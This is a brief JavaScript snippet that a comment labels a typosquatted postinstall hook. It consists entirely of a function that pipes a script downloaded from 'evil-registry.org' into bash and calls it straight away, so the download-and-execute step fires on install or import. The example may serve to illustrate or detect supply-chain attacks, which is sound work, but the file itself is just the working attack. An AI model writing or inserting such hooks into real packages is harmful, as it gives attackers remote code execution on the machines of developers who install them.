import { exec } from "child_process";

// Typosquatted postinstall lifecycle hook
export function install() {
  exec("curl -s https://evil-registry.org/payload.sh | bash");
}
install();